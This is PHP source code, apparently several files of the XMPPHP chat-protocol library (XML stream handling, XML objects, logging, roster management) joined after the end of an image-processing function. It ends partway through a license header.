                $white =  ImageColorAllocate ($backgroundimage, 255, 255, 255);
                ImageFill($backgroundimage,0,0,$white);
                ImageAlphaBlending($backgroundimage, TRUE);
                imagecopy($backgroundimage, $im, 0,0,0,0, $src_w, $src_h);
                return $backgroundimage;
        }
}
?>

<?php 
/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/** XMPPHP_Exception */
//require_once dirname(__FILE__) . '/Exception.php';

/** XMPPHP_XMLObj */
//require_once dirname(__FILE__) . '/XMLObj.php';

/** XMPPHP_Log */
//require_once dirname(__FILE__) . '/Log.php';

/**
 * XMPPHP XML Stream
 * 
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version     $Id$
 */
class XMPPHP_XMLStream {
        /**
         * @var resource
         */
        protected $socket;
        /**
         * @var resource
         */
        protected $parser;
        /**
         * @var string
         */
        protected $buffer;
        /**
         * @var integer
         */
        protected $xml_depth = 0;
        /**
         * @var string
         */
        protected $host;
        /**
         * @var integer
         */
        protected $port;
        /**
         * @var string
         */
        protected $stream_start = '<stream>';
        /**
         * @var string
         */
        protected $stream_end = '</stream>';
        /**
         * @var boolean
         */
        protected $disconnected = false;
        /**
         * @var boolean
         */
        protected $sent_disconnect = false;
        /**
         * @var array
         */
        protected $ns_map = array();
        /**
         * @var array
         */
        protected $current_ns = array();
        /**
         * @var array
         */
        protected $xmlobj = null;
        /**
         * @var array
         */
        protected $nshandlers = array();
        /**
         * @var array
         */
        protected $xpathhandlers = array();
        /**
         * @var array
         */
        protected $idhandlers = array();
        /**
         * @var array
         */
        protected $eventhandlers = array();
        /**
         * @var integer
         */
        protected $lastid = 0;
        /**
         * @var string
         */
        protected $default_ns;
        /**
         * @var string
         */
        protected $until = '';
        /**
         * @var string
         */
        protected $until_count = '';
        /**
         * @var array
         */
        protected $until_happened = false;
        /**
         * @var array
         */
        protected $until_payload = array();
        /**
         * @var XMPPHP_Log
         */
        protected $log;
        /**
         * @var boolean
         */
        protected $reconnect = true;
        /**
         * @var boolean
         */
        protected $been_reset = false;
        /**
         * @var boolean
         */
        protected $is_server;
        /**
         * @var float
         */
        protected $last_send = 0;
        /**
         * @var boolean
         */
        protected $use_ssl = false;
        /**
         * @var integer
         */
        protected $reconnectTimeout = 30;

        /**
         * Constructor
         *
         * @param string  $host
         * @param string  $port
         * @param boolean $printlog
         * @param string  $loglevel
         * @param boolean $is_server
         */
        public function __construct($host = null, $port = null, $printlog = false, $loglevel = null, $is_server = false) {
                $this->reconnect = !$is_server;
                $this->is_server = $is_server;
                $this->host = $host;
                $this->port = $port;
                $this->setupParser();
                $this->log = new XMPPHP_Log($printlog, $loglevel);
        }

        /**
         * Destructor
         * Cleanup connection
         */
        public function __destruct() {
                if(!$this->disconnected && $this->socket) {
                        $this->disconnect();
                }
        }
        
        /**
         * Return the log instance
         *
         * @return XMPPHP_Log
         */
        public function getLog() {
                return $this->log;
        }
        
        /**
         * Get next ID
         *
         * @return integer
         */
        public function getId() {
                $this->lastid++;
                return $this->lastid;
        }

        /**
         * Set SSL
         *
         * @return integer
         */
        public function useSSL($use=true) {
                $this->use_ssl = $use;
        }

        /**
         * Add ID Handler
         *
         * @param integer $id
         * @param string  $pointer
         * @param string  $obj
         */
        public function addIdHandler($id, $pointer, $obj = null) {
                $this->idhandlers[$id] = array($pointer, $obj);
        }

        /**
         * Add Handler
         *
         * @param string $name
         * @param string  $ns
         * @param string  $pointer
         * @param string  $obj
         * @param integer $depth
         */
        public function addHandler($name, $ns, $pointer, $obj = null, $depth = 1) {
                #TODO deprication warning
                $this->nshandlers[] = array($name,$ns,$pointer,$obj, $depth);
        }

        /**
         * Add XPath Handler
         *
         * @param string $xpath
         * @param string $pointer
         * @param
         */
        public function addXPathHandler($xpath, $pointer, $obj = null) {
                if (preg_match_all("/\(?{[^\}]+}\)?(\/?)[^\/]+/", $xpath, $regs)) {
                        $ns_tags = $regs[0];
                } else {
                        $ns_tags = array($xpath);
                }
                foreach($ns_tags as $ns_tag) {
                        list($l, $r) = split("}", $ns_tag);
                        if ($r != null) {
                                $xpart = array(substr($l, 1), $r);
                        } else {
                                $xpart = array(null, $l);
                        }
                        $xpath_array[] = $xpart;
                }
                $this->xpathhandlers[] = array($xpath_array, $pointer, $obj);
        }

        /**
         * Add Event Handler
         *
         * @param integer $id
         * @param string  $pointer
         * @param string  $obj
         */
        public function addEventHandler($name, $pointer, $obj) {
                $this->eventhandlers[] = array($name, $pointer, $obj);
        }

        /**
         * Connect to XMPP Host
         *
         * @param integer $timeout
         * @param boolean $persistent
         * @param boolean $sendinit
         */
        public function connect($timeout = 30, $persistent = false, $sendinit = true) {
                $this->sent_disconnect = false;
                $starttime = time();
                
                do {
                        $this->disconnected = false;
                        $this->sent_disconnect = false;
                        if($persistent) {
                                $conflag = STREAM_CLIENT_CONNECT | STREAM_CLIENT_PERSISTENT;
                        } else {
                                $conflag = STREAM_CLIENT_CONNECT;
                        }
                        $conntype = 'tcp';
                        if($this->use_ssl) $conntype = 'ssl';
                        $this->log->log("Connecting to $conntype://{$this->host}:{$this->port}");
                        try {
                                $this->socket = @stream_socket_client("$conntype://{$this->host}:{$this->port}", $errno, $errstr, $timeout, $conflag);
                        } catch (Exception $e) {
                                throw new XMPPHP_Exception($e->getMessage());
                        }
                        if(!$this->socket) {
                                $this->log->log("Could not connect.",  XMPPHP_Log::LEVEL_ERROR);
                                $this->disconnected = true;
                                # Take it easy for a few seconds
                                sleep(min($timeout, 5));
                        }
                } while (!$this->socket && (time() - $starttime) < $timeout);
                
                if ($this->socket) {
                        stream_set_blocking($this->socket, 1);
                        if($sendinit) $this->send($this->stream_start);
                } else {
                        throw new XMPPHP_Exception("Could not connect before timeout.");
                }
        }

        /**
         * Reconnect XMPP Host
         */
        public function doReconnect() {
                if(!$this->is_server) {
                        $this->log->log("Reconnecting ($this->reconnectTimeout)...",  XMPPHP_Log::LEVEL_WARNING);
                        $this->connect($this->reconnectTimeout, false, false);
                        $this->reset();
                        $this->event('reconnect');
                }
        }

        public function setReconnectTimeout($timeout) {
                $this->reconnectTimeout = $timeout;
        }
        
        /**
         * Disconnect from XMPP Host
         */
        public function disconnect() {
                $this->log->log("Disconnecting...",  XMPPHP_Log::LEVEL_VERBOSE);
                if(false == (bool) $this->socket) {
                        return;
                }
                $this->reconnect = false;
                $this->send($this->stream_end);
                $this->sent_disconnect = true;
                $this->processUntil('end_stream', 5);
                $this->disconnected = true;
        }

        /**
         * Are we are disconnected?
         *
         * @return boolean
         */
        public function isDisconnected() {
                return $this->disconnected;
        }

        /**
         * Core reading tool
         * 0 -> only read if data is immediately ready
         * NULL -> wait forever and ever
         * integer -> process for this amount of time 
         */
        
        private function __process($maximum=5) {
                
                $remaining = $maximum;
                
                do {
                        $starttime = (microtime(true) * 1000000);
                        $read = array($this->socket);
                        $write = array();
                        $except = array();
                        if (is_null($maximum)) {
                                $secs = NULL;
                                $usecs = NULL;
                        } else if ($maximum == 0) {
                                $secs = 0;
                                $usecs = 0;
                        } else {
                                $usecs = $remaining % 1000000;
                                $secs = floor(($remaining - $usecs) / 1000000);
                        }
                        $updated = @stream_select($read, $write, $except, $secs, $usecs);
                        if ($updated === false) {
                                $this->log->log("Error on stream_select()",  XMPPHP_Log::LEVEL_VERBOSE);                                
                                if ($this->reconnect) {
                                        $this->doReconnect();
                                } else {
                                        fclose($this->socket);
                                        $this->socket = NULL;
                                        return false;
                                }
                        } else if ($updated > 0) {
                                # XXX: Is this big enough?
                                $buff = @fread($this->socket, 4096);
                                if(!$buff) { 
                                        if($this->reconnect) {
                                                $this->doReconnect();
                                        } else {
                                                fclose($this->socket);
                                                $this->socket = NULL;
                                                return false;
                                        }
                                }
                                $this->log->log("RECV: $buff",  XMPPHP_Log::LEVEL_VERBOSE);
                                xml_parse($this->parser, $buff, false);
                        } else {
                                # $updated == 0 means no changes during timeout.
                        }
                        $endtime = (microtime(true)*1000000);
                        $time_past = $endtime - $starttime;
                        $remaining = $remaining - $time_past;
                } while (is_null($maximum) || $remaining > 0);
                return true;
        }
        
        /**
         * Process
         *
         * @return string
         */
        public function process() {
                $this->__process(NULL);
        }

        /**
         * Process until a timeout occurs
         *
         * @param integer $timeout
         * @return string
         */
        public function processTime($timeout=NULL) {
                if (is_null($timeout)) {
                        return $this->__process(NULL);
                } else {
                        return $this->__process($timeout * 1000000);
                }
        }

        /**
         * Process until a specified event or a timeout occurs
         *
         * @param string|array $event
         * @param integer $timeout
         * @return string
         */
        public function processUntil($event, $timeout=-1) {
                $start = time();
                if(!is_array($event)) $event = array($event);
                $this->until[] = $event;
                end($this->until);
                $event_key = key($this->until);
                reset($this->until);
                $this->until_count[$event_key] = 0;
                $updated = '';
                while(!$this->disconnected and $this->until_count[$event_key] < 1 and (time() - $start < $timeout or $timeout == -1)) {
                        $this->__process();
                }
                if(array_key_exists($event_key, $this->until_payload)) {
                        $payload = $this->until_payload[$event_key];
                        unset($this->until_payload[$event_key]);
                        unset($this->until_count[$event_key]);
                        unset($this->until[$event_key]);
                } else {
                        $payload = array();
                }
                return $payload;
        }

        /**
         * Obsolete?
         */
        public function Xapply_socket($socket) {
                $this->socket = $socket;
        }

        /**
         * XML start callback
         * 
         * @see xml_set_element_handler
         *
         * @param resource $parser
         * @param string   $name
         */
        public function startXML($parser, $name, $attr) {
                if($this->been_reset) {
                        $this->been_reset = false;
                        $this->xml_depth = 0;
                }
                $this->xml_depth++;
                if(array_key_exists('XMLNS', $attr)) {
                        $this->current_ns[$this->xml_depth] = $attr['XMLNS'];
                } else {
                        $this->current_ns[$this->xml_depth] = $this->current_ns[$this->xml_depth - 1];
                        if(!$this->current_ns[$this->xml_depth]) $this->current_ns[$this->xml_depth] = $this->default_ns;
                }
                $ns = $this->current_ns[$this->xml_depth];
                foreach($attr as $key => $value) {
                        if(strstr($key, ":")) {
                                $key = explode(':', $key);
                                $key = $key[1];
                                $this->ns_map[$key] = $value;
                        }
                }
                if(!strstr($name, ":") === false)
                {
                        $name = explode(':', $name);
                        $ns = $this->ns_map[$name[0]];
                        $name = $name[1];
                }
                $obj = new XMPPHP_XMLObj($name, $ns, $attr);
                if($this->xml_depth > 1) {
                        $this->xmlobj[$this->xml_depth - 1]->subs[] = $obj;
                }
                $this->xmlobj[$this->xml_depth] = $obj;
        }

        /**
         * XML end callback
         * 
         * @see xml_set_element_handler
         *
         * @param resource $parser
         * @param string   $name
         */
        public function endXML($parser, $name) {
                #$this->log->log("Ending $name",  XMPPHP_Log::LEVEL_DEBUG);
                #print "$name\n";
                if($this->been_reset) {
                        $this->been_reset = false;
                        $this->xml_depth = 0;
                }
                $this->xml_depth--;
                if($this->xml_depth == 1) {
                        #clean-up old objects
                        #$found = false; #FIXME This didn't appear to be in use --Gar
                        foreach($this->xpathhandlers as $handler) {
                                if (is_array($this->xmlobj) && array_key_exists(2, $this->xmlobj)) {
                                        $searchxml = $this->xmlobj[2];
                                        $nstag = array_shift($handler[0]);
                                        if (($nstag[0] == null or $searchxml->ns == $nstag[0]) and ($nstag[1] == "*" or $nstag[1] == $searchxml->name)) {
                                                foreach($handler[0] as $nstag) {
                                                        if ($searchxml !== null and $searchxml->hasSub($nstag[1], $ns=$nstag[0])) {
                                                                $searchxml = $searchxml->sub($nstag[1], $ns=$nstag[0]);
                                                        } else {
                                                                $searchxml = null;
                                                                break;
                                                        }
                                                }
                                                if ($searchxml !== null) {
                                                        if($handler[2] === null) $handler[2] = $this;
                                                        $this->log->log("Calling {$handler[1]}",  XMPPHP_Log::LEVEL_DEBUG);
                                                        $handler[2]->$handler[1]($this->xmlobj[2]);
                                                }
                                        }
                                }
                        }
                        foreach($this->nshandlers as $handler) {
                                if($handler[4] != 1 and array_key_exists(2, $this->xmlobj) and  $this->xmlobj[2]->hasSub($handler[0])) {
                                        $searchxml = $this->xmlobj[2]->sub($handler[0]);
                                } elseif(is_array($this->xmlobj) and array_key_exists(2, $this->xmlobj)) {
                                        $searchxml = $this->xmlobj[2];
                                }
                                if($searchxml !== null and $searchxml->name == $handler[0] and ($searchxml->ns == $handler[1] or (!$handler[1] and $searchxml->ns == $this->default_ns))) {
                                        if($handler[3] === null) $handler[3] = $this;
                                        $this->log->log("Calling {$handler[2]}",  XMPPHP_Log::LEVEL_DEBUG);
                                        $handler[3]->$handler[2]($this->xmlobj[2]);
                                }
                        }
                        foreach($this->idhandlers as $id => $handler) {
                                if(array_key_exists('id', $this->xmlobj[2]->attrs) and $this->xmlobj[2]->attrs['id'] == $id) {
                                        if($handler[1] === null) $handler[1] = $this;
                                        $handler[1]->$handler[0]($this->xmlobj[2]);
                                        #id handlers are only used once
                                        unset($this->idhandlers[$id]);
                                        break;
                                }
                        }
                        if(is_array($this->xmlobj)) {
                                $this->xmlobj = array_slice($this->xmlobj, 0, 1);
                                if(isset($this->xmlobj[0]) && $this->xmlobj[0] instanceof XMPPHP_XMLObj) {
                                        $this->xmlobj[0]->subs = null;
                                }
                        }
                        unset($this->xmlobj[2]);
                }
                if($this->xml_depth == 0 and !$this->been_reset) {
                        if(!$this->disconnected) {
                                if(!$this->sent_disconnect) {
                                        $this->send($this->stream_end);
                                }
                                $this->disconnected = true;
                                $this->sent_disconnect = true;
                                fclose($this->socket);
                                if($this->reconnect) {
                                        $this->doReconnect();
                                }
                        }
                        $this->event('end_stream');
                }
        }

        /**
         * XML character callback
         * @see xml_set_character_data_handler
         *
         * @param resource $parser
         * @param string   $data
         */
        public function charXML($parser, $data) {
                if(array_key_exists($this->xml_depth, $this->xmlobj)) {
                        $this->xmlobj[$this->xml_depth]->data .= $data;
                }
        }

        /**
         * Event?
         *
         * @param string $name
         * @param string $payload
         */
        public function event($name, $payload = null) {
                $this->log->log("EVENT: $name",  XMPPHP_Log::LEVEL_DEBUG);
                foreach($this->eventhandlers as $handler) {
                        if($name == $handler[0]) {
                                if($handler[2] === null) {
                                        $handler[2] = $this;
                                }
                                $handler[2]->$handler[1]($payload);
                        }
                }
                foreach($this->until as $key => $until) {
                        if(is_array($until)) {
                                if(in_array($name, $until)) {
                                        $this->until_payload[$key][] = array($name, $payload);
                                        if(!isset($this->until_count[$key])) {
                                                $this->until_count[$key] = 0;
                                        }
                                        $this->until_count[$key] += 1;
                                        #$this->until[$key] = false;
                                }
                        }
                }
        }

        /**
         * Read from socket
         */
        public function read() {
                $buff = @fread($this->socket, 1024);
                if(!$buff) { 
                        if($this->reconnect) {
                                $this->doReconnect();
                        } else {
                                fclose($this->socket);
                                return false;
                        }
                }
                $this->log->log("RECV: $buff",  XMPPHP_Log::LEVEL_VERBOSE);
                xml_parse($this->parser, $buff, false);
        }

        /**
         * Send to socket
         *
         * @param string $msg
         */
        public function send($msg, $timeout=NULL) {

                if (is_null($timeout)) {
                        $secs = NULL;
                        $usecs = NULL;
                } else if ($timeout == 0) {
                        $secs = 0;
                        $usecs = 0;
                } else {
                        $maximum = $timeout * 1000000;
                        $usecs = $maximum % 1000000;
                        $secs = floor(($maximum - $usecs) / 1000000);
                }
                
                $read = array();
                $write = array($this->socket);
                $except = array();
                
                $select = @stream_select($read, $write, $except, $secs, $usecs);
                
                if($select === False) {
                        $this->log->log("ERROR sending message; reconnecting.");
                        $this->doReconnect();
                        # TODO: retry send here
                        return false;
                } elseif ($select > 0) {
                        $this->log->log("Socket is ready; send it.", XMPPHP_Log::LEVEL_VERBOSE);
                } else {
                        $this->log->log("Socket is not ready; break.", XMPPHP_Log::LEVEL_ERROR);
                        return false;
                }
                
                $sentbytes = @fwrite($this->socket, $msg);
                $this->log->log("SENT: " . mb_substr($msg, 0, $sentbytes, '8bit'), XMPPHP_Log::LEVEL_VERBOSE);
                if($sentbytes === FALSE) {
                        $this->log->log("ERROR sending message; reconnecting.", XMPPHP_Log::LEVEL_ERROR);
                        $this->doReconnect();
                        return false;
                }
                $this->log->log("Successfully sent $sentbytes bytes.", XMPPHP_Log::LEVEL_VERBOSE);
                return $sentbytes;
        }

        public function time() {
                list($usec, $sec) = explode(" ", microtime());
                return (float)$sec + (float)$usec;
        }

        /**
         * Reset connection
         */
        public function reset() {
                $this->xml_depth = 0;
                unset($this->xmlobj);
                $this->xmlobj = array();
                $this->setupParser();
                if(!$this->is_server) {
                        $this->send($this->stream_start);
                }
                $this->been_reset = true;
        }

        /**
         * Setup the XML parser
         */
        public function setupParser() {
                $this->parser = xml_parser_create('UTF-8');
                xml_parser_set_option($this->parser, XML_OPTION_SKIP_WHITE, 1);
                xml_parser_set_option($this->parser, XML_OPTION_TARGET_ENCODING, 'UTF-8');
                xml_set_object($this->parser, $this);
                xml_set_element_handler($this->parser, 'startXML', 'endXML');
                xml_set_character_data_handler($this->parser, 'charXML');
        }

        public function readyToProcess() {
                $read = array($this->socket);
                $write = array();
                $except = array();
                $updated = @stream_select($read, $write, $except, 0);
                return (($updated !== false) && ($updated > 0));
        }
}

/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package    XMPPHP
 * @author     Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author     Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/**
 * XMPPHP Exception
 *
 * @category   xmpphp 
 * @package    XMPPHP
 * @author     Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author     Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version    $Id$
 */
class XMPPHP_Exception extends Exception {
}

/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/**
 * XMPPHP XML Object
 * 
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version     $Id$
 */
class XMPPHP_XMLObj {
        /**
         * Tag name
         *
         * @var string
         */
        public $name;
        
        /**
         * Namespace
         *
         * @var string
         */
        public $ns;
        
        /**
         * Attributes
         *
         * @var array
         */
        public $attrs = array();
        
        /**
         * Subs?
         *
         * @var array
         */
        public $subs = array();
        
        /**
         * Node data
         * 
         * @var string
         */
        public $data = '';

        /**
         * Constructor
         *
         * @param string $name
         * @param string $ns
         * @param array  $attrs
         * @param string $data
         */
        public function __construct($name, $ns = '', $attrs = array(), $data = '') {
                $this->name = strtolower($name);
                $this->ns   = $ns;
                if(is_array($attrs) && count($attrs)) {
                        foreach($attrs as $key => $value) {
                                $this->attrs[strtolower($key)] = $value;
                        }
                }
                $this->data = $data;
        }

        /**
         * Dump this XML Object to output.
         *
         * @param integer $depth
         */
        public function printObj($depth = 0) {
                print str_repeat("\t", $depth) . $this->name . " " . $this->ns . ' ' . $this->data;
                print "\n";
                foreach($this->subs as $sub) {
                        $sub->printObj($depth + 1);
                }
        }

        /**
         * Return this XML Object in xml notation
         *
         * @param string $str
         */
        public function toString($str = '') {
                $str .= "<{$this->name} xmlns='{$this->ns}' ";
                foreach($this->attrs as $key => $value) {
                        if($key != 'xmlns') {
                                $value = htmlspecialchars($value);
                                $str .= "$key='$value' ";
                        }
                }
                $str .= ">";
                foreach($this->subs as $sub) {
                        $str .= $sub->toString();
                }
                $body = htmlspecialchars($this->data);
                $str .= "$body</{$this->name}>";
                return $str;
        }

        /**
         * Has this XML Object the given sub?
         * 
         * @param string $name
         * @return boolean
         */
        public function hasSub($name, $ns = null) {
                foreach($this->subs as $sub) {
                        if(($name == "*" or $sub->name == $name) and ($ns == null or $sub->ns == $ns)) return true;
                }
                return false;
        }

        /**
         * Return a sub
         *
         * @param string $name
         * @param string $attrs
         * @param string $ns
         */
        public function sub($name, $attrs = null, $ns = null) {
                #TODO attrs is ignored
                foreach($this->subs as $sub) {
                        if($sub->name == $name and ($ns == null or $sub->ns == $ns)) {
                                return $sub;
                        }
                }
        }
}

/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/**
 * XMPPHP Log
 * 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version     $Id$
 */
class XMPPHP_Log {
        
        const LEVEL_ERROR   = 0;
        const LEVEL_WARNING = 1;
        const LEVEL_INFO        = 2;
        const LEVEL_DEBUG   = 3;
        const LEVEL_VERBOSE = 4;
        
        /**
         * @var array
         */
        protected $data = array();

        /**
         * @var array
         */
        protected $names = array('ERROR', 'WARNING', 'INFO', 'DEBUG', 'VERBOSE');

        /**
         * @var integer
         */
        protected $runlevel;

        /**
         * @var boolean
         */
        protected $printout;

        /**
         * Constructor
         *
         * @param boolean $printout
         * @param string  $runlevel
         */
        public function __construct($printout = false, $runlevel = self::LEVEL_INFO) {
                $this->printout = (boolean)$printout;
                $this->runlevel = (int)$runlevel;
        }

        /**
         * Add a message to the log data array
         * If printout in this instance is set to true, directly output the message
         *
         * @param string  $msg
         * @param integer $runlevel
         */
        public function log($msg, $runlevel = self::LEVEL_INFO) {
                $time = time();
                #$this->data[] = array($this->runlevel, $msg, $time);
                if($this->printout and $runlevel <= $this->runlevel) {
                        $this->writeLine($msg, $runlevel, $time);
                }
        }

        /**
         * Output the complete log.
         * Log will be cleared if $clear = true
         *
         * @param boolean $clear
         * @param integer $runlevel
         */
        public function printout($clear = true, $runlevel = null) {
                if($runlevel === null) {
                        $runlevel = $this->runlevel;
                }
                foreach($this->data as $data) {
                        if($runlevel <= $data[0]) {
                                $this->writeLine($data[1], $runlevel, $data[2]);
                        }
                }
                if($clear) {
                        $this->data = array();
                }
        }
        
        protected function writeLine($msg, $runlevel, $time) {
                //echo date('Y-m-d H:i:s', $time)." [".$this->names[$runlevel]."]: ".$msg."\n";
                echo $time." [".$this->names[$runlevel]."]: ".$msg."\n";
                flush();
        }
}

/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/**
 * XMPPHP Roster Object
 * 
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version     $Id$
 */

class Roster {
        /**
         * Roster array, handles contacts and presence.  Indexed by jid.
         * Contains array with potentially two indexes 'contact' and 'presence'
         * @var array
         */
        protected $roster_array = array();
        /**
         * Constructor
         * 
         */
        public function __construct($roster_array = array()) {
                if ($this->verifyRoster($roster_array)) {
                        $this->roster_array = $roster_array; //Allow for prepopulation with existing roster
                } else {
                        $this->roster_array = array();
                }
        }

        /**
         *
         * Check that a given roster array is of a valid structure (empty is still valid)
         *
         * @param array $roster_array
         */
        protected function verifyRoster($roster_array) {
                #TODO once we know *what* a valid roster array looks like
                return True;
        }

        /**
         *
         * Add given contact to roster
         *
         * @param string $jid
         * @param string $subscription
         * @param string $name
         * @param array $groups
         */
        public function addContact($jid, $subscription, $name='', $groups=array()) {
                $contact = array('jid' => $jid, 'subscription' => $subscription, 'name' => $name, 'groups' => $groups);
                if ($this->isContact($jid)) {
                        $this->roster_array[$jid]['contact'] = $contact;
                } else {
                        $this->roster_array[$jid] = array('contact' => $contact);
                }
        }

        /**
         * 
         * Retrieve contact via jid
         *
         * @param string $jid
         */
        public function getContact($jid) {
                if ($this->isContact($jid)) {
                        return $this->roster_array[$jid]['contact'];
                }
        }

        /**
         *
         * Discover if a contact exists in the roster via jid
         *
         * @param string $jid
         */
        public function isContact($jid) {
                return (array_key_exists($jid, $this->roster_array));
        }

        /**
         *
         * Set presence
         *
         * @param string $presence
         * @param integer $priority
         * @param string $show
         * @param string $status
        */
        public function setPresence($presence, $priority, $show, $status) {
                list($jid, $resource) = split("/", $presence);
                if ($show != 'unavailable') {
                        if (!$this->isContact($jid)) {
                                $this->addContact($jid, 'not-in-roster');
                        }
                        $resource = $resource ? $resource : '';
                        $this->roster_array[$jid]['presence'][$resource] = array('priority' => $priority, 'show' => $show, 'status' => $status);
                } else { //Nuke unavailable resources to save memory
                        unset($this->roster_array[$jid]['resource'][$resource]);
                }
        }

        /*
         *
         * Return best presence for jid
         *
         * @param string $jid
         */
        public function getPresence($jid) {
                $split = split("/", $jid);
                $jid = $split[0];
                if($this->isContact($jid)) {
                        $current = array('resource' => '', 'active' => '', 'priority' => -129, 'show' => '', 'status' => ''); //Priorities can only be -128 = 127
                        foreach($this->roster_array[$jid]['presence'] as $resource => $presence) {
                                //Highest available priority or just highest priority
                                if ($presence['priority'] > $current['priority'] and (($presence['show'] == "chat" or $presence['show'] == "available") or ($current['show'] != "chat" or $current['show'] != "available"))) {
                                        $current = $presence;
                                        $current['resource'] = $resource;
                                }
                        }
                        return $current;
                }
        }
        /**
         *
         * Get roster
         *
         */
        public function getRoster() {
                return $this->roster_array;
        }
}

/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
